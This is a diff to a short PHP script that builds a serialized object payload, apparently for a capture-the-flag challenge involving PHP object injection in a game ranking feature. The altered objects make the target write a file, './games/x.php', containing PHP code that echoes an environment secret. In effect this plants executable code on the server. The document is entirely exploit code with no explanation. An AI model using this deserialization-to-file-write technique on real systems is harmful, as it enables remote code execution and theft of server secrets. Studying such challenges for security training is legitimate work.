@@ -1,19 +1,15 @@
 <?php
 
 class Ranking {
-	public $ranking = [];
-	public $path = "./games/ranking";
+	public $ranking = '<?php echo $_ENV["FLAG"] ?>';
+	public $path = "./games/x.php";
 	public $changed = true;
-
-	public function __construct(){
-		array_push($this->ranking, new Game("<?php php_info() ?>", 99));
-	}
 }
 
 class Game {
 
 	public $gameBoard = [];
-	public $actions = [];
+	public $actions = ["up"];
 	public $initgameBoard = [];
 	public $srand = 0;
 	public $name = "ciao";
@@ -23,15 +19,15 @@ class Game {
 	public function __construct($name, $score){
 		$this->name = $name;
 		$this->score = $score;
+		$this->ranking = new Ranking;
 	}
 
 	public function __toString() {
-		var_dump(/*$this->initgameBoard, $this->gameBoard, */$this->actions, $this->ranking/*, $this->score, $this->srand, $this->name*/);
+		var_dump(/*$this->initgameBoard, $this->gameBoard, */$this->actions/*, $this->ranking/*, $this->score, $this->srand, $this->name*/);
 		return "";
 	}
 }
 
 $game1 = new Game("giorgio", 50);
-$game1->ranking = new Ranking();
 
 echo serialize($game1);
